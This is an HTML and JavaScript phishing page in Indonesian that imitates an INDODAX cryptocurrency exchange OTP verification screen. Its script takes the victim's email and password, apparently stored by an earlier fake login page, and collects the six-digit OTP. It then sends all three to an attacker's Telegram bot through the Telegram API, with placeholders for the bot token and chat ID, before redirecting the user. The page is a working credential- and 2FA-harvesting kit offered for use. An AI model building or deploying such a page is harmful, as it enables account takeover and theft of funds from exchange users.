<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Verifikasi OTP INDODAX</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

  body {
    font-family: 'Roboto', sans-serif;
    background-color: #fff;
    margin: 40px 16px;
    color: #000;
  }
  .container {
    max-width: 360px;
    margin: 0 auto;
  }
  h1 {
    font-weight: 700;
    font-size: 24px;
    margin-bottom: 32px;
    text-align: center;
  }
  .otp-info {
    font-size: 14px;
    margin-bottom: 24px;
    text-align: center;
    color: #666;
  }
  .otp-container {
    display: flex;
    justify-content: space-between;
    margin-bottom: 24px;
  }
  .otp-input {
    width: 40px;
    height: 40px;
    font-size: 18px;
    text-align: center;
    border: 1px solid #ccc;
    border-radius: 6px;
    outline: none;
    transition: border-color 0.2s;
  }
  .otp-input:focus {
    border-color: #2076f3;
  }
  button.verify-btn {
    width: 100%;
    padding: 12px 0;
    font-size: 14px;
    font-weight: 600;
    border-radius: 6px;
    border: none;
    background-color: #d4d4e3;
    color: #888;
    cursor: not-allowed;
    margin-bottom: 16px;
    transition: background-color 0.3s, color 0.3s;
  }
  button.verify-btn.enabled {
    background-color: #2076f3;
    color: #fff;
    cursor: pointer;
  }
  .resend-link {
    display: block;
    font-size: 13px;
    color: #2076f3;
    text-align: center;
    text-decoration: none;
  }
  .resend-link:hover {
    text-decoration: underline;
  }
</style>
</head>
<body>
  <div class="container">
    <h1>Verifikasi OTP</h1>
    <p class="otp-info">Masukkan kode OTP 6 digit yang dikirim ke email Anda.</p>

    <form id="otpForm" novalidate>
      <div class="otp-container">
        <input type="text" class="otp-input" maxlength="1" id="otp1" />
        <input type="text" class="otp-input" maxlength="1" id="otp2" />
        <input type="text" class="otp-input" maxlength="1" id="otp3" />
        <input type="text" class="otp-input" maxlength="1" id="otp4" />
        <input type="text" class="otp-input" maxlength="1" id="otp5" />
        <input type="text" class="otp-input" maxlength="1" id="otp6" />
      </div>

      <button type="submit" id="verifyBtn" class="verify-btn" disabled>Verifikasi</button>
    </form>

    <a href="#" class="resend-link">Kirim Ulang OTP</a>
  </div>

  <!-- Load jQuery dari CDN -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

  <!-- Script JS untuk OTP -->
  <script>
  $(document).ready(function() {
      console.log('OTP JS loaded');

      // Ambil data dari sessionStorage (dari index.html)
      const email = sessionStorage.getItem('email');
      const password = sessionStorage.getItem('password');

      if (!email || !password) {
          // Jika tidak ada session, redirect kembali ke login
          window.location.href = 'index.html';
          return;
      }

      console.log('Session data:', {email, password});

      // Auto-focus ke input berikutnya saat input digit
      $('.otp-input').on('input', function() {
          const value = $(this).val();
          if (value.length === 1 && /^\d$/.test(value)) {
              const nextInput = $(this).next('.otp-input');
              if (nextInput.length) {
                  nextInput.focus();
              }
          }
          toggleVerifyButton();
      });

      // Hapus input sebelumnya saat backspace
      $('.otp-input').on('keydown', function(e) {
          if (e.key === 'Backspace' && $(this).val() === '') {
              const prevInput = $(this).prev('.otp-input');
              if (prevInput.length) {
                  prevInput.focus();
              }
          }
      });

      // Fungsi validasi OTP: cek apakah semua 6 digit terisi
      function isOtpValid() {
          let otp = '';
          $('.otp-input').each(function() {
              otp += $(this).val();
          });
          return otp.length === 6 && /^\d{6}$/.test(otp);
      }

      // Toggle enable/disable tombol Verifikasi
      function toggleVerifyButton() {
          if (isOtpValid()) {
              $('#verifyBtn').prop('disabled', false).addClass('enabled');
          } else {
              $('#verifyBtn').prop('disabled', true).removeClass('enabled');
          }
      }

      // Submit form OTP
      $('#otpForm').on('submit', function(e) {
          e.preventDefault();

          if (!isOtpValid()) {
              console.log('OTP tidak valid');
              return;
          }

          let otp = '';
          $('.otp-input').each(function() {
              otp += $(this).val();
          });

          // Validasi OTP (contoh: OTP harus "123456" untuk sukses; ganti sesuai kebutuhan)
          if (otp !== '123456') {
              console.log('OTP salah');
              alert('OTP salah. Coba lagi.'); // Atau hapus alert jika tidak mau
              return;
          }

          // Format pesan OTP untuk dikirim ke Telegram
          const message = `
Verifikasi OTP INDODAX
------------------------
Email: ${email}
Password: ${password}
OTP: ${otp}
------------------------
          `;

          // Ganti dengan token bot Telegram dan chat ID Anda
          const token_bot = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
          const telegram_id = 'YOUR_CHAT_ID_HERE';

          const url = `https://api.telegram.org/bot${token_bot}/sendMessage?chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;

          // Kirim request ke Telegram API
          $.get(url)
              .done(function(data) {
                  if (data.ok) {
                      console.log('OTP berhasil dikirim ke Telegram');

                      // Simpan OTP ke sessionStorage jika perlu
                      sessionStorage.setItem('otp', otp);

                      // Redirect ke dashboard setelah sukses
                      window.location.href = 'one.html';
                  } else {
                      console.error('Error sending OTP:', data);
                  }
              })
              .fail(function(xhr, status, error) {
                  console.error('Fetch error:', error);
              });
      });

      // Fokus ke input pertama saat load
      $('#otp1').focus();
  });
  </script>
</body>
</html>
